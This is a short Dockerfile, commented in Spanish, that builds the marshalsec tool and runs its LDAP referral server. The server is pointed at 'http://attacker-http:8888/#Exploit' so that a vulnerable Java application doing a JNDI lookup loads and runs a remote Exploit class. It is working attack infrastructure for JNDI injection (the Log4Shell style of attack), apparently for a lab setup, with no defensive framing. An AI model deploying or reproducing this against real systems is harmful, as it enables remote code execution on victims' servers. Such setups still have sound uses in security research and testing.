# Compila marshalsec (servidor LDAP de referidos para JNDI).
# Descarga el fuente por tarball con ADD -> no necesita git ni apt.
FROM maven:3.8-openjdk-8 AS build
WORKDIR /src
ADD https://github.com/mbechler/marshalsec/archive/refs/heads/master.tar.gz /src/ms.tar.gz
RUN tar xzf ms.tar.gz \
 && cd marshalsec-master \
 && mvn -q -B clean package -DskipTests

# Runtime: levanta el servidor LDAP que refiere a la clase remota del HTTP
FROM openjdk:8u181-jre-alpine
COPY --from=build /src/marshalsec-master/target/marshalsec-0.0.3-SNAPSHOT-all.jar /ms.jar
EXPOSE 1389
CMD ["java", "-cp", "/ms.jar", "marshalsec.jndi.LDAPRefServer", "http://attacker-http:8888/#Exploit"]
